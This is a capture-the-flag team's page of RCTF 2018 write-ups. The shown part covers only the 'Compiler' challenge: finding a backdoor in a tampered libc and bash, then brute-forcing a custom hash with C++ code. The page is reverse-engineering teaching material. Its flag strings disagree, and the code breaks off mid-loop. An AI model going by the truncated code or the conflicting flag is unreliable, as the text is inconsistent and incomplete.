<!doctype html><html lang=en dir=ltr class=scroll-smooth data-default-appearance=dark data-auto-appearance=false><head><meta charset=utf-8><meta http-equiv=content-language content="en"><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=theme-color><title>Rctf 2018 - Write ups &#183; mhackeroni</title><meta name=title content="Rctf 2018 - Write ups &#183; mhackeroni"><meta name=description content="This is the collection of all of our write-ups for rctf2018. Our final result was an incredible 3rd place !!"><link rel=canonical href=https://mhackeroni.it/writeups/2018-05-27-rctf-2018-all-writeups/><link type=text/css rel=stylesheet href=/css/main.bundle.min.1d8c7618f0ef6623fd6ebffc2988f58f128a919c43d2ed5d99a0621768c50d3ec37bd1e02b3eb119ba92bc64d53422281addaaa107a57202376dbd6a14e2e50e.css integrity="sha512-HYx2GPDvZiP9br/8KYj1jxKKkZxD0u1dmaBiF2jFDT7De9HgKz6xGbqSvGTVNCIoGt2qoQelcgI3bb1qFOLlDg=="><script type=text/javascript src=/js/appearance.min.2a7f28406ff67c2e3fedcfa49ff1dc78cca5f4b2ace4618a279f94d3fd241566af610abcf38bb98ec3f039afc0acbb3c27e9eced17e4a072f1a98e18a628ec7e.js integrity="sha512-Kn8oQG/2fC4/7c+kn/HceMyl9LKs5GGKJ5+U0/0kFWavYQq884u5jsPwOa/ArLs8J+ns7RfkoHLxqY4Ypijsfg=="></script><script defer type=text/javascript id=script-bundle src=/js/main.bundle.min.a187118b41a60744310065c567365de85730c8495301d0ebae41810cc6f7a47432b1de7d4f3b11338959f1ac50c266be6b4b73acf6bf770016eb59b602cc1aa0.js integrity="sha512-oYcRi0GmB0QxAGXFZzZd6FcwyElTAdDrrkGBDMb3pHQysd59TzsRM4lZ8axQwma+a0tzrPa/dwAW61m2AswaoA==" data-copy=Copy data-copied=Copied></script><script src=/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7+kfJ6kKCJxQGC+8wm+Bz9JucDjDTGNew=="></script><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><meta property="og:url" content="https://mhackeroni.it/writeups/2018-05-27-rctf-2018-all-writeups/"><meta property="og:site_name" content="mhackeroni"><meta property="og:title" content="Rctf 2018 - Write ups"><meta property="og:description" content="This is the collection of all of our write-ups for rctf2018. Our final result was an incredible 3rd place !!"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2018-05-27T00:00:00+00:00"><meta property="article:modified_time" content="2018-05-27T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Rctf 2018 - Write ups"><meta name=twitter:description content="This is the collection of all of our write-ups for rctf2018. Our final result was an incredible 3rd place !!"><script type=application/ld+json>[{"@context":"https://schema.org","@type":"Article","articleSection":"","name":"Rctf 2018 - Write ups","headline":"Rctf 2018 - Write ups","description":"This is the collection of all of our write-ups for rctf2018. Our final result was an incredible 3rd place !!","inLanguage":"en","url":"https:\/\/mhackeroni.it\/writeups\/2018-05-27-rctf-2018-all-writeups\/","author":{"@type":"Person","name":"mhackeroni"},"copyrightYear":"2018","dateCreated":"2018-05-27T00:00:00\u002b00:00","datePublished":"2018-05-27T00:00:00\u002b00:00","dateModified":"2018-05-27T00:00:00\u002b00:00","mainEntityOfPage":"true","wordCount":"14061"}]</script><meta name=author content="mhackeroni"><link href=https://bsky.app/profile/mhackeroni.bsky.social rel=me><link href=https://www.facebook.com/mhackeroni rel=me><link href=https://github.com/mhackeroni/ rel=me><link href=https://www.linkedin.com/company/mhackeroni-inc/ rel=me><link href=https://x.com/mhackeroni rel=me><link href=https://www.youtube.com/@mhackeroni rel=me><script src=/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj+KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script></head><body class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600"><div id=the-top class="absolute flex self-center"><a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600" href=#main-content><span class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a></div><div class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3 pt-[2px] pr-0 pb-[3px] pl-0"><div><a href=/ class=flex><span class=sr-only>mhackeroni</span>
<img src=/mhackeroni-stylized-square.webp width=1024 height=1024 class="logo max-h-[5rem] max-w-[5rem] object-scale-down object-left nozoom" alt=mhackeroni></a></div><div class="flex flex-1 items-center justify-between"><nav class="flex space-x-3"><a href=/ class="text-base font-medium text-gray-500 hover:text-gray-900">mhackeroni</a></nav><nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12"><a href=/news/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title>News</p></a><a href=/writeups/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title>Writeups</p></a><a href=/sponsors/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title=Sponsors>Sponsors</p></a><a href=/gallery/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title="üì∑  Photo Gallery">Gallery</p></a><a href class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title></p></a><button id=search-button aria-label=Search class="text-base hover:text-primary-600 dark:hover:text-primary-400" title="Search (/)">
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></button></nav><div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12"><span></span>
<button id=search-button-mobile aria-label=Search class="text-base hover:text-primary-600 dark:hover:text-primary-400" title="Search (/)">
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></button></div></div><div class="-my-2 md:hidden"><div id=menu-button class=block><div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416c17.7.0 32 14.33 32 32 0 17.7-14.3 32-32 32H32C14.33 128 0 113.7.0 96zM0 256c0-17.7 14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32H32c-17.67.0-32-14.3-32-32zM416 448H32c-17.67.0-32-14.3-32-32s14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32z"/></svg></span></div><div id=menu-wrapper class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50 pt-[5px]"><ul class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl"><li id=menu-close-button><span class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></span></li><li class=mt-1><a href=/news/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title>News</p></a></li><li class=mt-1><a href=/writeups/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title>Writeups</p></a></li><li class=mt-1><a href=/sponsors/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title=Sponsors>Sponsors</p></a></li><li class=mt-1><a href=/gallery/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title="üì∑  Photo Gallery">Gallery</p></a></li><li class=mt-1><a href class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title></p></a></li></ul></div></div></div></div><div class="relative flex flex-col grow"><main id=main-content class=grow><article><header id=single_header class="mt-5 max-w-prose"><h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">Rctf 2018 - Write ups</h1><div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden"><div class="flex flex-row flex-wrap items-center"><time datetime=2018-05-27T00:00:00+00:00>27 May 2018</time><span class="px-2 text-primary-500">&#183;</span><span>14061 words</span><span class="px-2 text-primary-500">&#183;</span><span title="Reading time">67 mins</span></div></div></header><section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row"><div class="min-w-0 min-h-0 max-w-fit"><div class="article-content max-w-prose mb-20"><p>This is the collection of all of our write-ups for rctf2018. Our final result was an incredible 3rd place !!</p><h2 class="relative group">Index<div id=index class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#index aria-label=Anchor>#</a></span></h2><p><a href=#compiler>Compiler</a> - <a href=#git>Git</a> - <a href=#cpushop>CPUSHOP</a> - <a href=#ecdh>ECDH</a> - <a href=#sql>SQL</a> - <a href=#babyre2>babyre2</a> - <a href=#cats>Cats</a> - <a href=#cats-rev-2>Cats Rev. 2</a> - <a href=#no-js>No-js</a> - <a href=#babyheap>babyheap</a> - <a href=#rblog-2018>rBlog 2018</a> - <a href=#rblog-2018-v2>rBlog 2018 v2</a> - <a href=#520gift>520gift</a> - <a href=#number-magic>Number magic</a> - <a href=#simulator>Simulator</a> - <a href=#stringer>stringer</a> - <a href=#simple-vm>Simple vm</a> - <a href=#babyre>Babyre</a> - <a href=#sign>Sign</a> - <a href=#amp>AMP</a> - <a href=#rnote3>RNote3</a> - <a href=#simple-re>Simple re</a> - <a href=#rnote4>RNote4</a> - <a href=#backdoor>backdoor</a> - <a href=#r-cursive>r-cursive</a></p><h4 class="relative group"><a href=#disqus_thread>Comments section</a><div id=comments-section class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#comments-section aria-label=Anchor>#</a></span></h4><h2 class="relative group">Compiler<div id=compiler class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#compiler aria-label=Anchor>#</a></span></h2><p><a href=https://mega.nz/#!z7o1kIbB!pIHPh0-3K4N5bM2Ray1zkp76XJe-WvKc3yR1sgdCygM target=_blank>Attachment(original link)</a></p><p>We are given an ISO image of a bootable Arch Linux distro.</p><p>In &ldquo;/home&rdquo; there was a .c file. Being the challenge name &ldquo;compiler&rdquo;, we compiled and executed it. Besides printing the expected &ldquo;hello world&rdquo; message, the binary also creates a backdoor file.</p><p>Grepping for &ldquo;backdoor&rdquo; we find that libc.a matches.
Further grepping for &ldquo;rctf&rdquo; inside its objects files, we notice that libc_start.o matches.</p><p>Inside libc_start we see a series of hints and by comparing the function with the original archlinux libc.a, we notice that a number of new basic blocks were added.</p><p>We debugged the application to analyze the modified code. There was a loop that was writing in a buffer, so we dumped its contents right after all the computations were performed.
This way we obtained the first part of the flag: &ldquo;RCTF{Without&rdquo;.</p><p>Meanwhile, a hint for compiler was released, saying &ldquo;try "flag" command&rdquo;. By issuing the &ldquo;flag&rdquo; command in bash, we see unexpected strings on the terminal.
&ldquo;flag&rdquo; was neither an alias, nor a binary in the system, so after some thoughts we decided to check out &ldquo;bash&rdquo;.
Indeed &ldquo;bash&rdquo; was re-compiled statically, so we assumed it had been tampered. In fact we found that a set of new builtin commands were added to bash, namely &ldquo;prince&rdquo;, &ldquo;queen&rdquo;, &ldquo;flag&rdquo; together with a set of other aliases.</p><p>Each of those custom builtins were printing some stuff using the &ldquo;print_flag_string&rdquo; function.
This function xor&rsquo;s each character with 0x03, so we scripted a bit to extract all the strings:</p><pre><code>    Who has been sitting in my chair?
    Who has been eating from my plate?
    Who has been eating my bread?
    Who has been eating my vegetables?
    Who has been eating with my fork?
    Who has been drinking from my cup?
    Oh good heaven!
    This child is beautiful!
    So Snow White lived happily with the dwarves.
    So Snow White lived happily with the dwarves.
    So Snow White lived happily with the dwarves.
    So Snow White lived happily with the dwarves.
    So Snow White lived happily with the dwarves.
    Good heavens, where am I?
    Oh, my dear, you saved me!
    Look at here, I stole this from the queen's pocket!
    &quot;The hashes of remaining flag is: 13340610174042144018, 95741437967718225, 484886919005526&quot;
    &quot;The flag is [part1, plain(hash1), plain(hash2), plain(hash3), '}').join('')&quot;
    I know the queen hijacked me by a function which used this hash algorithm!
    The evil queen was banished from the land forever and the prince and Snow White lived happily ever after.
    Mirror, mirror, on the wall,
    Who in this land is fairest of all?
    You, my queen, are fair; it is true.
    But Snow White, beyond the mountains
    With the seven dwarves,
    Is still a thousand times fairer than you.
    I'll easily get rid of my apples.  Here, I'll give you one of them.
    Look, I'll cut the apple in two.  You eat half and I shall eat half.
    White as snow, red as blood, black as ebony wood! The dwarves shall never awaken you.
    OK, you're right. But you cannot wake her up unless you know how the Snow White dead.
    Give me the executable name of 'flag':
    Let me have the coffin. I will give you anything you want for it.
    Who can wake the Snow White up? Call him!
</code></pre><p>We can see that a few strings give some hints regarding the flag:</p><pre><code>    The flag is [part1, plain(hash1), plain(hash2), plain(hash3), '}').join('')
    The hashes of remaining flag is: 13340610174042144018, 95741437967718225, 484886919005526
    I know the queen hijacked me by a function which used this hash algorithm!
</code></pre><p>The last string hints to the hashing algorithm used by bash to manage the builtin aliases. Normally bash uses the &ldquo;khash&rdquo; algorithm, but by inspecting the custom &ldquo;bash&rdquo; binary, we noticed that the hash function &ldquo;hash_string&rdquo; was modified.</p><p>We reversed the customized hashing algorithm, and since the hashes were known, we bruteforced all possible combinations of strings using a charset of <code>[a-zA-Z0-9_]</code> to get the expected hashes.</p><p>We had to bruteforce 8+ characters at a time, so the only feasible solution is a meet in the middle algorithm.<br>We cached 4 characters worth of hashes and then bruteforced the rest computing the reverse hash and looking for a match in the hash.<br>We didn&rsquo;t find any collision and later the author told us that he modified the standard bash hashing algorithm to avoid collisions.</p><p>This way we obtained the final part of the flag. The flag was &ldquo;RCTF{Without_no_seAms_NoR_nEeDlework}&rdquo;.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;cstring&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;iostream&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;map&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=k>using</span> <span class=k>namespace</span> <span class=n>std</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>map</span><span class=o>&lt;</span><span class=kt>unsigned</span> <span class=kt>long</span> <span class=kt>long</span><span class=p>,</span> <span class=n>string</span><span class=o>&gt;</span> <span class=n>m</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>long</span> <span class=kt>long</span> <span class=nf>mhash</span><span class=p>(</span><span class=n>string</span> <span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>long</span> <span class=kt>long</span> <span class=n>result</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>long</span> <span class=kt>long</span> <span class=n>p</span> <span class=o>=</span> <span class=mi>139</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=k>auto</span> <span class=nl>v</span> <span class=p>:</span> <span class=n>s</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>result</span> <span class=o>=</span> <span class=p>(</span><span class=n>p</span> <span class=o>*</span> <span class=n>result</span><span class=p>)</span> <span class=o>^</span> <span class=p>(</span><span class=n>v</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>long</span> <span class=kt>long</span> <span class=nf>rhash</span><span class=p>(</span><span class=n>string</span> <span class=n>s</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>long</span> <span class=kt>long</span> <span class=n>start</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 139^-1 mod 2^64
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>unsigned</span> <span class=kt>long</span> <span class=kt>long</span> <span class=n>p</span> <span class=o>=</span> <span class=mi>4246732448623781667ull</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>long</span> <span class=kt>long</span> <span class=n>result</span> <span class=o>=</span> <span class=n>start</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=k>auto</span> <span class=nl>v</span> <span class=p>:</span> <span class=n>s</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>result</span> <span class=o>=</span> <span class=p>(</span><span class=n>p</span> <span class=o>*</span> <span class=p>(</span><span class=n>result</span> <span class=o>^</span> <span class=n>v</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>string</span> <span class=nf>rev</span><span class=p>(</span><span class=n>string</span> <span class=n>s</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>string</span> <span class=n>t</span> <span class=o>=</span> <span class=s>&#34;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=k>auto</span> <span class=nl>c</span> <span class=p>:</span> <span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>t</span> <span class=o>=</span> <span class=p>(</span><span class=n>c</span><span class=p>)</span> <span class=o>+</span> <span class=n>t</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>t</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=c1>// RCTF{With_no_seAms_NoR_nEeDlework}
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cm>/*Dlekrow}
</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=n>printable</span><span class=p>[]</span> <span class=o>=</span> <span class=s>&#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>string</span> <span class=n>w</span> <span class=o>=</span> <span class=s>&#34;0123&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>string</span> <span class=n>w1</span> <span class=o>=</span> <span class=s>&#34;01234&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;inv &#34;</span> <span class=o>&lt;&lt;</span> <span class=mi>4246732448623781667ull</span> <span class=o>*</span> <span class=mi>139ull</span> <span class=o>&lt;&lt;</span> <span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;=</span> <span class=n>strlen</span><span class=p>(</span><span class=n>printable</span><span class=p>);</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>w</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>printable</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=n>i</span> <span class=o>&lt;&lt;</span> <span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>j</span> <span class=o>&lt;=</span> <span class=n>strlen</span><span class=p>(</span><span class=n>printable</span><span class=p>);</span> <span class=n>j</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>w</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>printable</span><span class=p>[</span><span class=n>j</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>k</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>k</span> <span class=o>&lt;=</span> <span class=n>strlen</span><span class=p>(</span><span class=n>printable</span><span class=p>);</span> <span class=n>k</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=n>w</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=n>printable</span><span class=p>[</span><span class=n>k</span><span class=p>];</span>
</span></span><span class=line><span class=cl>                <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>l</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>l</span> <span class=o>&lt;=</span> <span class=n>strlen</span><span class=p>(</span><span class=n>printable</span><span class=p>);</span> <span class=n>l</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=n>w</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=n>printable</span><span class=p>[</span><span class=n>l</span><span class=p>];</span>
</span></span><span class=line><span class=cl>                    <span class=k>auto</span> <span class=n>z</span> <span class=o>=</span> <span class=n>mhash</span><span class=p>(</span><span class=n>w</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=p>(</span><span class=n>m</span><span class=p>.</span><span class=n>find</span><span class=p>(</span><span class=n>z</span><span class=p>)</span> <span class=o>!=</span> <span class=n>m</span><span class=p>.</span><span class=n>end</span><span class=p>())</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                        <span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;collision &#34;</span> <span class=o>&lt;&lt;</span> <span class=n>w</span> <span class=o>&lt;&lt;</span> <span class=sc>&#39; &#39;</span> <span class=o>&lt;&lt;</span> <span class=n>m</span><span class=p>[</span><span class=n>z</span><span class=p>]</span> <span class=o>&lt;&lt;</span> <span class=sc>&#39;\n&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                    <span class=p>}</span>
</span></span><span class=line><span class=cl>                    <span class=n>m</span><span class=p>[</span><span class=n>z</span><span class=p>]</span> <span class=o>=</span> <span class=n>w</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;=</span> <span class=n>strlen</span><span class=p>(</span><span class=n>printable</span><span class=p>);</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>w1</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>printable</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=n>i</span> <span class=o>&lt;&lt;</span> <span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>j</span> <span class=o>&lt;=</span> <span class=n>strlen</span><span class=p>(</span><span class=n>printable</span><span class=p>);</span> <span class=n>j</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=c1>// cout &lt;&lt; j &lt;&lt; endl;
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=n>w1</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>printable</span><span class=p>[</span><span class=n>j</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>k</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>k</span> <span class=o>&lt;=</span> <span class=n>strlen</span><span class=p>(</span><span class=n>printable</span><span class=p>);</span> <span class=n>k</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=n>w1</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=n>printable</span><span class=p>[</span><span class=n>k</span><span class=p>];</span>
</span></span><span class=line><span class=cl>                <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>l</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>l</span> <span class=o>&lt;=</span> <span class=n>strlen</span><span class=p>(</span><span class=n>printable</span><span class=p>);</span> <span class=n>l</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=n>w1</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=n>printable</span><span class=p>[</span><span class=n>l</span><span class=p>];</span>
</span></span><span class=line><span class=cl>                    <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>s</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>s</span> <span class=o>&lt;=</span> <span class=n>strlen</span><span class=p>(</span><span class=n>printable</span><span class=p>);</span> <span class=n>s</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
